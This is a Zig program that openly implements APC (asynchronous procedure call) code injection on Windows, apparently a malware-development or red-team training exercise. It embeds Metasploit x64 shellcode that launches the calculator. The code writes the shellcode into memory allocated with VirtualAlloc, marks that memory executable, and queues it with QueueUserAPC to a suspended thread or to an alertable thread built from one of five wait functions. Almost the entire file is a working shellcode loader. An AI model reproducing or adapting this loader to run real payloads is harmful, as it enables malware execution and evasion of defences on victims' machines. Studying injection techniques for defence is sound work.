const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Windows API types
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const PVOID = windows.PVOID;
const LPVOID = windows.LPVOID;
const PBYTE = [*]u8;
const SIZE_T = windows.SIZE_T;
const LPTHREAD_START_ROUTINE = *const fn (LPVOID) callconv(WINAPI) DWORD;
const PAPCFUNC = *const fn (windows.ULONG_PTR) callconv(WINAPI) void;

// Constants
const CREATE_SUSPENDED: DWORD = 0x00000004;
const INFINITE: DWORD = 0xFFFFFFFF;
const PAGE_READWRITE: DWORD = windows.PAGE_READWRITE;
const PAGE_EXECUTE_READWRITE: DWORD = windows.PAGE_EXECUTE_READWRITE;
const MEM_COMMIT: DWORD = windows.MEM_COMMIT;
const MEM_RESERVE: DWORD = windows.MEM_RESERVE;
const QS_KEY: DWORD = 0x0001;
const MWMO_ALERTABLE: DWORD = 0x0002;

// External function declarations
extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: SIZE_T,
    lpStartAddress: LPTHREAD_START_ROUTINE,
    lpParameter: ?LPVOID,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn VirtualAlloc(
    lpAddress: ?LPVOID,
    dwSize: SIZE_T,
    flAllocationType: DWORD,
    flProtect: DWORD,
) callconv(WINAPI) ?LPVOID;

extern "kernel32" fn VirtualProtect(
    lpAddress: LPVOID,
    dwSize: SIZE_T,
    flNewProtect: DWORD,
    lpflOldProtect: *DWORD,
) callconv(WINAPI) BOOL;

extern "kernel32" fn QueueUserAPC(
    pfnAPC: PAPCFUNC,
    hThread: HANDLE,
    dwData: windows.ULONG_PTR,
) callconv(WINAPI) BOOL;

extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;
extern "kernel32" fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) callconv(WINAPI) DWORD;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
extern "kernel32" fn SleepEx(dwMilliseconds: DWORD, bAlertable: BOOL) callconv(WINAPI) DWORD;
extern "kernel32" fn CreateEventW(
    lpEventAttributes: ?*anyopaque,
    bManualReset: BOOL,
    bInitialState: BOOL,
    lpName: ?windows.LPCWSTR,
) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn WaitForSingleObjectEx(
    hHandle: HANDLE,
    dwMilliseconds: DWORD,
    bAlertable: BOOL,
) callconv(WINAPI) DWORD;
extern "kernel32" fn WaitForMultipleObjectsEx(
    nCount: DWORD,
    lpHandles: [*]const HANDLE,
    bWaitAll: BOOL,
    dwMilliseconds: DWORD,
    bAlertable: BOOL,
) callconv(WINAPI) DWORD;
extern "user32" fn MsgWaitForMultipleObjectsEx(
    nCount: DWORD,
    pHandles: ?[*]const HANDLE,
    dwMilliseconds: DWORD,
    dwWakeMask: DWORD,
    dwFlags: DWORD,
) callconv(WINAPI) DWORD;
extern "kernel32" fn SignalObjectAndWait(
    hObjectToSignal: HANDLE,
    hObjectToWaitOn: HANDLE,
    dwMilliseconds: DWORD,
    bAlertable: BOOL,
) callconv(WINAPI) DWORD;

// x64 calc metasploit shellcode
const Payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// Suspended thread function
fn dummyFunction(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;

    // Dummy code
    var prng = std.Random.DefaultPrng.init(@intCast(std.time.timestamp()));
    const random = prng.random();
    const j = random.int(i32);
    const i = j + random.int(i32);
    _ = i;

    return 0;
}

// Alertable thread functions
fn alertableFunction1(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;
    _ = SleepEx(INFINITE, 1); // TRUE = 1
    return 0;
}

fn alertableFunction2(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;

    const hEvent = CreateEventW(null, 0, 0, null);
    if (hEvent != null) {
        _ = WaitForSingleObjectEx(hEvent.?, INFINITE, 1); // TRUE = 1
        _ = CloseHandle(hEvent.?);
    }
    return 0;
}

fn alertableFunction3(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;

    const hEvent = CreateEventW(null, 0, 0, null);
    if (hEvent != null) {
        const handles = [_]HANDLE{hEvent.?};
        _ = WaitForMultipleObjectsEx(1, &handles, 1, INFINITE, 1); // TRUE = 1
        _ = CloseHandle(hEvent.?);
    }
    return 0;
}

fn alertableFunction4(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;

    const hEvent = CreateEventW(null, 0, 0, null);
    if (hEvent != null) {
        const handles = [_]HANDLE{hEvent.?};
        _ = MsgWaitForMultipleObjectsEx(1, &handles, INFINITE, QS_KEY, MWMO_ALERTABLE);
        _ = CloseHandle(hEvent.?);
    }
    return 0;
}

fn alertableFunction5(lpParameter: LPVOID) callconv(WINAPI) DWORD {
    _ = lpParameter;

    const hEvent1 = CreateEventW(null, 0, 0, null);
    const hEvent2 = CreateEventW(null, 0, 0, null);

    if (hEvent1 != null and hEvent2 != null) {
        _ = SignalObjectAndWait(hEvent1.?, hEvent2.?, INFINITE, 1); // TRUE = 1
        _ = CloseHandle(hEvent1.?);
        _ = CloseHandle(hEvent2.?);
    }
    return 0;
}

// FIXED: Get user input function - return []const u8 instead of []u8
fn getUserInput(allocator: std.mem.Allocator, prompt: []const u8) ![]const u8 {
    const stdin = std.io.getStdIn().reader();
    print("{s}", .{prompt});

    var buffer: [256]u8 = undefined;
    if (try stdin.readUntilDelimiterOrEof(buffer[0..], '\n')) |input| {
        // Trim whitespace and return a copy
        const trimmed = std.mem.trim(u8, input, " \t\r\n");
        const result = try allocator.dupe(u8, trimmed);
        return result;
    }
    return "";
}

// Wait for user input
fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

// APC injection function
fn runViaApcInjection(hThread: HANDLE, pPayload: []const u8) bool {
    var dwOldProtection: DWORD = 0;

    const pAddress = VirtualAlloc(null, pPayload.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == null) {
        print("\t[!] VirtualAlloc Failed With Error : {}\n", .{GetLastError()});
        return false;
    }

    // Copy payload to allocated memory
    @memcpy(@as([*]u8, @ptrCast(pAddress))[0..pPayload.len], pPayload);

    print("\t[i] Payload Written To : 0x{X}\n", .{@intFromPtr(pAddress)});

    if (VirtualProtect(pAddress.?, pPayload.len, PAGE_EXECUTE_READWRITE, &dwOldProtection) == 0) {
        print("\t[!] VirtualProtect Failed With Error : {}\n", .{GetLastError()});
        return false;
    }

    waitForEnter("\t[#] Press <Enter> To Run ... ");

    // Queue the APC
    if (QueueUserAPC(@ptrCast(pAddress), hThread, 0) == 0) {
        print("\t[!] QueueUserAPC Failed With Error : {}\n", .{GetLastError()});
        return false;
    }

    return true;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var hThread: ?HANDLE = null;
    var dwThreadId: DWORD = 0;
    var useAlertableThread = false;

    // Display banner
    print("\n=== APC Injection ===\n", .{});

    // Get thread type choice
    print("Choose thread type:\n", .{});
    print("  [1] Suspended Thread (Resume after APC queue)\n", .{});
    print("  [2] Alertable Thread (Execute immediately)\n", .{});
    const choice = try getUserInput(allocator, "Enter your choice (1 or 2): ");
    defer allocator.free(choice);

    if (std.mem.eql(u8, choice, "2")) {
        useAlertableThread = true;
        print("\n[+] Alertable Thread Mode Selected\n\n", .{});

        // Get alertable function choice
        print("Choose alertable function:\n", .{});
        print("  [1] SleepEx(INFINITE, TRUE)\n", .{});
        print("  [2] WaitForSingleObjectEx with alertable flag\n", .{});
        print("  [3] WaitForMultipleObjectsEx with alertable flag\n", .{});
        print("  [4] MsgWaitForMultipleObjectsEx with alertable flag\n", .{});
        print("  [5] SignalObjectAndWait with alertable flag\n", .{});
        const funcChoice = try getUserInput(allocator, "Enter your choice (1-5): ");
        defer allocator.free(funcChoice);

        const alertableFunctions = [_]LPTHREAD_START_ROUTINE{
            alertableFunction1,
            alertableFunction2,
            alertableFunction3,
            alertableFunction4,
            alertableFunction5,
        };

        const funcNames = [_][]const u8{
            "SleepEx",
            "WaitForSingleObjectEx",
            "WaitForMultipleObjectsEx",
            "MsgWaitForMultipleObjectsEx",
            "SignalObjectAndWait",
        };

        const choiceNum = std.fmt.parseInt(u8, funcChoice, 10) catch 1;
        const selectedFunc = if (choiceNum >= 1 and choiceNum <= 5) choiceNum - 1 else 0;

        print("\n[+] Selected: alertableFunction{} ({s})\n", .{ selectedFunc + 1, funcNames[selectedFunc] });
        hThread = CreateThread(null, 0, alertableFunctions[selectedFunc], null, 0, &dwThreadId);
        if (hThread == null) {
            print("[!] CreateThread Failed With Error : {}\n", .{GetLastError()});
            return;
        }
        print("[+] Alertable Target Thread Created With Id : {}\n", .{dwThreadId});
    } else {
        useAlertableThread = false;
        print("\n[+] Suspended Thread Mode Selected\n\n", .{});

        hThread = CreateThread(null, 0, dummyFunction, null, CREATE_SUSPENDED, &dwThreadId);
        if (hThread == null) {
            print("[!] CreateThread Failed With Error : {}\n", .{GetLastError()});
            return;
        }
        print("[+] Suspended Target Thread Created With Id : {}\n", .{dwThreadId});
    }

    print("\n", .{});

    //-------------------------------------------------------------------------------------------

    print("[i] Running APC Injection Function ...\n", .{});
    if (!runViaApcInjection(hThread.?, &Payload)) {
        return;
    }
    print("[+] DONE\n\n", .{});

    //-------------------------------------------------------------------------------------------

    if (!useAlertableThread) {
        // Resuming the thread in case we are targeting a suspended thread
        print("[i] Resuming Suspended Thread...", .{});
        _ = ResumeThread(hThread.?);
        print("[+] DONE\n", .{});
    } else {
        print("[i] APC queued to alertable thread, payload should execute automatically\n", .{});
    }

    //-------------------------------------------------------------------------------------------

    print("[i] Waiting for thread completion...\n", .{});
    _ = WaitForSingleObject(hThread.?, INFINITE);

    waitForEnter("\n[#] Press <Enter> To Quit ... ");

    _ = CloseHandle(hThread.?);
}
